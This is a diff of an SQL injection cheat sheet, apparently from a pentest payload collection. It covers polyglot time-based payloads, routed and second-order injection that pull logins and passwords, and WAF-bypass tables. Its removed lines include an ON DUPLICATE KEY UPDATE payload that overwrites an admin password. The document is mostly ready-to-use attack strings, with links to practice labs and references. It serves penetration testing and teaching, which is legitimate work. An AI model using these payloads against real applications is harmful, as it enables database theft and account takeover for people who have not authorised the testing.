+A polygot SQL injection payload is a specially crafted SQL injection attack string that can successfully execute in multiple contexts or environments without modification. This means that the payload can bypass different types of validation, parsing, or execution logic in a web application or database by being valid SQL in various scenarios.
 
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
-
-/* MySQL only */
-IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 ```
 
-## Routed injection
+
+## Routed Injection
+
+> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus
+
+In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.
+
+**Example 1**:
+
+`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`
 
 ```sql
-admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+' union select 0x2720756e696f6e2073656c65637420312c3223#
 ```
 
-## Insert Statement - ON DUPLICATE KEY UPDATE
+**Example 2**:
 
-ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
+`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.
 
 ```sql
-Inject using payload:
-  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
-
-The query would look like this:
-INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
-
-This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
-Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".
-
-After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
+-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
 ```
 
-## WAF Bypass
 
-### White spaces alternatives
+## Second Order SQL Injection
 
-No Space (%20) - bypass using whitespace alternatives
+Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
 
-```sql
-?id=1%09and%091=1%09--
-?id=1%0Dand%0D1=1%0D--
-?id=1%0Cand%0C1=1%0C--
-?id=1%0Band%0B1=1%0B--
-?id=1%0Aand%0A1=1%0A--
-?id=1%A0and%A01=1%A0--
+```py
+username="anything' UNION SELECT Username, Password FROM Users;--"
+password="P@ssw0rd"
 ```
 
-No Whitespace - bypass using comments
+Since you are inserting your payload in the database for a later use, any other type of injections can be used UNION, ERROR, BLIND, STACKED, etc.
 
-```sql
-?id=1/*comment*/and/**/1=1/**/--
-```
 
-No Whitespace - bypass using parenthesis
+## Generic WAF Bypass
 
-```sql
-?id=(1)and(1)=(1)--
-```
+### White Spaces
 
-Whitespace alternatives by DBMS
-| DBMS | ASCII characters in hexadicimal |
-| ---- | ------------------------------- |
-| SQLite3 | 0A, 0D, 0C, 09, 20 |
-| MySQL	5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
-| MySQL	3	| 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
+Bypass using whitespace alternatives.
+
+| Bypass                   | Technique              |
+| ------------------------ | ---------------------- |
+| `?id=1%09and%091=1%09--` | Whitespace alternative |
+| `?id=1%0Aand%0A1=1%0A--` | Whitespace alternative |
+| `?id=1%0Band%0B1=1%0B--` | Whitespace alternative |
+| `?id=1%0Cand%0C1=1%0C--` | Whitespace alternative |
+| `?id=1%0Dand%0D1=1%0D--` | Whitespace alternative |
+| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
+| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
+
+| DBMS       | ASCII characters in hexadecimal |
+| ---------- | ------------------------------- |
+| SQLite3    | 0A, 0D, 0C, 09, 20 |
+| MySQL	5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
+| MySQL	3	   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
 | PostgreSQL | 0A, 0D, 0C, 09, 20 |
 | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
-| MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
+| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
 
-Example of query where spaces were replaced by ascii characters above 0x80
-```
-♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
-```
+
+Bypass using comments and parenthesis.
+
+| Bypass                                    | Technique            |
+| ----------------------------------------- | -------------------- |
+| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment              |
+| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |
+| `?id=(1)and(1)=(1)--`                     | Parenthesis          |
+
  
-### No Comma
+### No Comma Allowed
  
-Bypass using OFFSET, FROM and JOIN
+Bypass using `OFFSET`, `FROM` and `JOIN`.
 
-```sql
-LIMIT 0,1         -> LIMIT 1 OFFSET 0
-SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
-SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
-```
+| Forbidden           | Bypass |
+| ------------------- | ------ |
+| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0` |
+| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
+| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |
 
-### No Equal
+
+### No Equal Allowed
 
 Bypass using LIKE/NOT IN/IN/BETWEEN
 
-```sql
-?id=1 and substring(version(),1,1)like(5)
-?id=1 and substring(version(),1,1)not in(4,3)
-?id=1 and substring(version(),1,1)in(4,3)
-?id=1 and substring(version(),1,1) between 3 and 4
-```
 
-### Case modification
- 
-Bypass using uppercase/lowercase (see keyword AND)
+| Bypass    | SQL Example |
+| --------- | ------------------------------------------ |
+| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
+| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
+| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
+| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |
 
-```sql
-?id=1 AND 1=1#
-?id=1 AnD 1=1#
-?id=1 aNd 1=1#
-```
 
-Bypass using keywords case insensitive / Bypass using an equivalent operator
+### Case Modification
 
-```sql
-AND   -> &&
-OR    -> ||
-=     -> LIKE,REGEXP, BETWEEN, not < and not >
-> X   -> not between 0 and X
-WHERE -> HAVING
-```
+Bypass using uppercase/lowercase.
 
-### Obfuscation by DBMS
+| Bypass    | Technique  |
+| --------- | ---------- |
+| `AND`     | Uppercase  |
+| `and`     | Lowercase  |
+| `aNd`     | Mixed case |
 
-MySQL
-```
-1.UNION	SELECT	2	
-3.2UNION	SELECT	2	
-1e0UNION	SELECT	2	
-SELECT\N/0.e3UNION	SELECT	2	
-1e1AND-0.0UNION	SELECT	2	
-1/*!12345UNION/*!31337SELECT/*!table_name*/	
-{ts	1}UNION	SELECT.``	1.e.table_name	
-SELECT	$.``	1.e.table_name	
-SELECT{_	.``1.e.table_name}	
-SELECT	LightOS	.	``1.e.table_name	LightOS	
-SELECT	information_schema 1337.e.tables	13.37e.table_name	
-SELECT	1	from	information_schema 9.e.table_name
-```
 
-MSSQL
-```
-.1UNION	SELECT	2	
-1.UNION	SELECT.2alias	
-1e0UNION	SELECT	2	
-1e1AND-1=0.0UNION	SELECT	2	
-SELECT	0xUNION	SELECT	2	
-SELECT\UNION	SELECT	2	
-\1UNION	SELECT	2	
-SELECT	1FROM[table]WHERE\1=\1AND\1=\1	
-SELECT"table_name"FROM[information_schema].[tables]	
-```
+Bypass using keywords case insensitive or an equivalent operator.
 
-Oracle
-```
-1FUNION	SELECT	2	
-1DUNION	SELECT	2	
-SELECT	0x7461626c655f6e616d65	FROM	all_tab_tables
-SELECT	CHR(116)	||	CHR(97)	||	CHR(98)	FROM	all_tab_tables
-SELECT%00table_name%00FROM%00all_tab_tables
-```
+| Forbidden | Bypass                      |
+| --------- | --------------------------- |
+| `AND`     | `&&`                        |
+| `OR`      | `\|\|`                      |
+| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |
+| `>`       | `NOT BETWEEN 0 AND X`       |
+| `WHERE`   | `HAVING`                    |
 
-### More MySQL specific
-
-`information_schema.tables` alternative
-
-```sql
-select * from mysql.innodb_table_stats;
-+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
-| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
-+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
-| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
-| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
-...
-+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
-
-mysql> show tables in dvwa;
-+----------------+
-| Tables_in_dvwa |
-+----------------+
-| guestbook      |
-| users          |
-+----------------+
-```
-
-Version Alternative
-
-```sql
-mysql> select @@innodb_version;
-+------------------+
-| @@innodb_version |
-+------------------+
-| 5.6.31           |
-+------------------+
-
-mysql> select @@version;
-+-------------------------+
-| @@version               |
-+-------------------------+
-| 5.6.31-0ubuntu0.15.10.1 |
-+-------------------------+
-
-mysql> mysql> select version();
-+-------------------------+
-| version()               |
-+-------------------------+
-| 5.6.31-0ubuntu0.15.10.1 |
-+-------------------------+
-```
-
-#### WAF bypass for MySQL using scientific notation
-
-Blocked
-```sql
-' or ''='
-```
-Working
-```sql
-' or 1.e('')='
-```
-Obfuscated query
-```sql
-1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
-```
 
 ## Labs 
 
-* [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
-* [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
-* [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
-* [SQL Labs](https://portswigger.net/web-security/all-labs#sql-injection)
+* [PortSwigger - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+* [PortSwigger - SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+* [PortSwigger - SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+* [PortSwigger - SQL Labs](https://portswigger.net/web-security/all-labs#sql-injection)
+* [Root Me - SQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)
+* [Root Me - SQL injection - Authentication - GBK](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK)
+* [Root Me - SQL injection - String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)
+* [Root Me - SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
+* [Root Me - SQL injection - Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)
+* [Root Me - SQL injection - Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)
+* [Root Me - SQL injection - Insert](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)
+* [Root Me - SQL injection - File reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)
+* [Root Me - SQL injection - Time based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)
+* [Root Me - SQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Blind)
+* [Root Me - SQL injection - Second Order](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Second-Order)
+* [Root Me - SQL injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)
+* [Root Me - SQL Truncation](https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation)
+
 
 ## References
 
-* Detect SQLi
-  * [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
-  * [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
-* MySQL:
-  * [PentestMonkey's mySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
-  * [Reiners mySQL injection Filter Evasion Cheatsheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
-  * [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
-  * [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
-* MSSQL:
-  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet](http://evilsql.com/main/page2.php)
-  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-* ORACLE:
-  * [PentestMonkey's Oracle SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
-* POSTGRESQL:
-  * [PentestMonkey's Postgres SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
-* Others
-  * [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-  * [Access SQLi Cheatsheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
-  * [PentestMonkey's Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
-  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
-  * [Pentestmonkey's Informix SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
-  * [SQLite3 Injection Cheat sheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
-  * [Ruby on Rails (Active Record) SQL Injection Guide](http://rails-sqli.org/)
-  * [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
-  * [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
-  * [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
-* Second Order:
-  * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
-  * [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
-* Sqlmap:
-  * [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
-* WAF:
-  * [SQLi Optimization and Obfuscation Techniques](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf) by Roberto Salgado
-  * [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
-                                                                            
+* [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - February 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
+* [Implement a Blind Error-Based SQLMap payload for SQLite - soka - August 24, 2023](https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html)
+* [Manual SQL Injection Discovery Tips - Gerben Javado - August 26, 2017](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
+* [NetSPI SQL Injection Wiki - NetSPI - December 21, 2017](https://sqlwiki.netspi.com/)
+* [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+* [SQLi Cheatsheet - NetSparker - March 19, 2022](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+* [SQLi in INSERT worse than SELECT - Mathias Karlsson - Feb 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
+* [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)
+* [The SQL Injection Knowledge base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection)
